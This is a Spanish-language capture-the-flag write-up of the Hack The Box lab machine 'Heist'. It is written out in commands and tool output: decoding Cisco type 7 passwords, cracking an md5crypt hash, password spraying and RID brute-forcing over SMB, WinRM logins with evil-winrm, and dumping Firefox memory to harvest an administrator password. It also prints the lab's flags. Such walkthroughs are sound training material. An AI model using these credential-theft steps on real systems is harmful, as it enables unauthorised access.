---
tags:
title: Heist- Easy (HTB)
permalink: /Heist-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introducción

# Reconocimiento

```bash
nmap -sCV -p80,135,445,5985,49669 10.129.96.157                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 03:27 -03
Nmap scan report for 10.129.96.157
Host is up (0.65s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: 54s
| smb2-time: 
|   date: 2025-12-02T06:29:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.50 seconds
```
## Website / Port 80 

En la pagina principal veo un panel de `login` pero sin credenciales no puedo hacer nada, y acá, las inyecciones `SQL` no me sirven de nada.

![image-center](/assets/images/{21A4975A-3B3D-4F98-A6DF-6580EA49F585}.png)

Probando credenciales cualquiera sale el siguiente mensaje de error en una pagina aparte, lo que parece ser una imagen.

![image-center](/assets/images/{E7FA2F87-96F3-4BB8-9D32-A723BABB5666}.png)
### Hashes

Si clickeo en `Login as guest` me sale la siguiente interfaz.

![image-center](/assets/images/{3872E0AF-FF77-4175-8503-38AB0A0C8E60}.png)

Debajo el mensaje de `Hazard` veo un botón `Attachment` que me envía a una pagina con el siguiente contenido.

```bash
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```
### Cisco cracker tool

Es acá donde veo algunas password y los usuarios `rout3r, admin` , además las pass están en formato de `cisco` por lo que ejecute el siguiente comando para crackear los hashes.

```bash
wget https://raw.githubusercontent.com/theevilbit/ciscot7/master/ciscot7.py

# Decodificar
python3 ciscot7.py -d -p 0242114B0E143F015F5D1E161713
python3 ciscot7.py -d -p 02375012182C1A1D751618034F36415408
--2025-12-02 03:44:03--  https://raw.githubusercontent.com/theevilbit/ciscot7/master/ciscot7.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8002::154, 2606:50c0:8003::154, 2606:50c0:8000::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|2606:50c0:8002::154|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3224 (3.1K) [text/plain]
Saving to: ‘ciscot7.py’

ciscot7.py                                     100%[===================================================================================================>]   3.15K  --.-KB/s    in 0s      

2025-12-02 03:44:03 (47.7 MB/s) - ‘ciscot7.py’ saved [3224/3224]

Decrypted password: $uperP@ssword
Decrypted password: Q4)sJu\Y8qz*A3?d
```

Probando las creds en el panel de `login` no son útiles, así que seguí al paso de crackear el hash que esta en formato `md5crypt`.

```bash
echo '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
stealth1agent    (?)     
1g 0:00:00:32 DONE (2025-12-02 03:47) 0.03045g/s 106757p/s 106757c/s 106757C/s stealthy001..stcroix85
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
## Shell as chase
### Password spraying

Ahora con todas las credenciales y los usuario que recolecte puedo realizar un `Password Spraying` de cada una contra cada usuario de la lista

```bash
 cat pass   
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d

cat users                                               
rout3r
admin
hazard
```

Use `nxc` para realizar la operación anteriormente mencionada.

```bash
nxc smb heist.htb -u users -p pass 
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False) 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
```
### RID Brute

Ahora como tengo credenciales validas puedo validarlas contra el servicio de `WinRM`, pero no son validas.

```bash
nxc winrm heist.htb -u hazard -p 'stealth1agent'
WINRM       10.129.96.157   5985   SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 (name:SUPPORTDESK) (domain:SupportDesk)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.96.157   5985   SUPPORTDESK      [-] SupportDesk\hazard:stealth1agent

```

Es así como use las mismas para detectar usuarios validos realizando un `Brute force` del `RID` de cada usuario con el propio `nxc`.
```bash
nxc smb heist.htb -u hazard -p 'stealth1agent' --rid-brute  
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False) 
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
SMB         10.129.96.157   445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.129.96.157   445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
```

Ahora que recolecte mas usuario realice el mismo proceso para cada uno de estos

```bash
nxc winrm heist.htb -u users -p pass --continue-on-success
<SNIP>
WINRM       10.129.96.157   5985   SUPPORTDESK      [+] SupportDesk\chase:Q4)sJu\Y8qz*A3?d (Pwn3d!)
<SNIP>
```

Como tengo credenciales validas para `chase` me conecto vía `WinRM`

```powershell
evil-winrm -i heist.htb -u chase -p 'Q4)sJu\Y8qz*A3?d'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents>
```

```powershell
*Evil-WinRM* PS C:\Users\Chase\Documents> type ../desktop/user.txt
e94e1768d0835faba5f9009e91e47cc0
```
## Shell as nt authority\system

### Enumeration

Enumerando procesos veo que `firefox` tiene `5` procesos corriendo y además corre como otro usuario ya que con el `SI 1` significa que hay otra sesión interactiva en el sistema, la cual puede ser la de `system` o la de `administrator`
```powershell
*Evil-WinRM* PS C:\Users\Chase\Documents> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    473      18     2212       5384               360   0 csrss
    290      13     2244       5132               476   1 csrss
    357      15     3480      14624              5016   1 ctfmon
    253      14     3940      13364              3952   0 dllhost
    166       9     1840       9736       0.02   6692   1 dllhost
    614      32    29064      57900               944   1 dwm
   1490      57    23564      78536              4616   1 explorer
   1162      67   122120     199992       3.11   6324   1 firefox
    347      19    10172      38724       0.03   6436   1 firefox
    401      33    30780      87708       0.38   6584   1 firefox
    378      28    22064      58744       0.19   6812   1 firefox
    355      25    16392      38964       0.09   7160   1 firefox
<SNIP>
```
### Procdump

Es así que me descargue [procdump](https://github.com/Sysinternals/sysinternals/blob/master/sysinternals/downloads/procdump.md) para hacer un volcado de la memoria del proceso con el identificador `6324` que en este caso es `Firefox`, y con el comando `-accepteula` le indico que acepto el `acuerdo de licencia de usuario final`.

```bash
*Evil-WinRM* PS C:\programdata> C:\programdata\procdump.exe -accepteula -ma 6324 C:\programdata\firefox_dump_6324.dmp

ProcDump v11.1 - Sysinternals process dump utility
Copyright (C) 2009-2025 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[13:13:31]Dump 1 info: Available space: 3650056192
[13:13:31]Dump 1 initiated: C:\programdata\firefox_dump_6324.dmp
[13:13:31]Dump 1 writing: Estimated dump file size is 490 MB.
[13:13:32]Dump 1 complete: 491 MB written in 1.3 seconds
[13:13:32]Dump count reached.
```

Ahora que tengo el archivo `.dmp` puedo ver con `strings` los datos imprimibles y legibles para así filtrar por algunas palabras, y de esta manera poder ver datos importantes.

```bash
strings /home/user/htb/chase/firefox_dump_6324.dmp | grep -E "password|clave|admin|user|login" -A 5 -B 5
```

Así pude ver en múltiples ocasiones un log con las credenciales de el usuario `admin` con una credencial 
```dmp
:$Bf
pCE 
LMEMp
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
pCE 
pCE 
pCE 

```

Y estas mismas las use para loguearme como el usuario `Administrator` y asi poder ver la flag.

```powershell
evil-winrm -i heist.htb -u administrator -p '4dD!5}x/re8]FBuZ'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../desktop/root.txt
c94dfdd8be2ffe6e69ca333b447660a2
```

`~Happy Hacking.`